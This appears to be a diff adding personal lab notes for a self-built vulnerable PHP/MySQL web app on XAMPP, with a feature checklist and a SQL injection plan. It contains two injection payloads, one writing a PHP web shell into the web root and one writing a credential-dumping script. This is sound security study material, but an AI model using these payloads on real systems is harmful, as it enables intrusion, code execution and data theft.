@@ -1,0 +1,29 @@
+XAMPP
+
+php web application + mysql
+- register /
+- login /
+- display profile /
+
+view profile of other users
+- edit user profile /
+- user image (link/upload) /
+- search user /
+- delete user /
+
+sql injection on login pages
+- bypass login /
+- dump database 
+- rce 
+
+' UNION SELECT NULL,NULL,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\php_web_inject\\malicious.php' -- 
+' UNION SELECT NULL,NULL,'<?php include('DBconnection.php'); $query = "SELECT username FROM credential "; $result = mysqli_query($conn, $query); for($i=1;$i<=mysqli_num_rows($result);$i++){$row = $result -> fetch_assoc(); var_dump($row);  ?>' INTO OUTFILE 'C:\\xampp\\htdocs\\php_web_inject\\malicious.php' -- 
+
+-------------------------------
+admin role
+- admin page /
+- lookup hostname (nslookup) /
+
+vm ubuntu
+- overthewire
+- ssh server
